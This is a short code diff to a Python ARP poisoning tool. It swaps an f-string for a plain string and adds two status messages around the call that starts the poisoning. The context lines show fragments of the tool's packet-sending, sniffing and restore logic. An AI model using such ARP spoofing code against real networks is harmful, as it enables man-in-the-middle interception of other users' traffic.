@@ -34,7 +34,7 @@ def arp_poison(src_ip, src_mac, target_ip, target_mac, interface='eth0'):
             sendp(newpkt, iface=interface)
 
     try:
-        print(f"ARP Poisoning started. Press CTRL+C to stop.")
+        print("ARP Poisoning started. Press CTRL+C to stop.")
         sniff(iface=interface, prn=lambda x: poison_packet(x))
     except KeyboardInterrupt:
         restore_arp_tables(interface)
@@ -54,7 +54,9 @@ def main():
         if not validate_ipv4(ip_src) or not validate_ipv4(ip_target):
             print("Invalid IP address format. Please use IPv4 addresses.")
             exit(1)
+        print("Valid IP addresses entered.")
         arp_poison(ip_src, mac_src, ip_target, mac_target)
+        print("ARP Poisoning completed successfully.")
     except ValueError:
         print("Invalid IP address format. Please use IPv4 addresses.")
     except Exception as e:
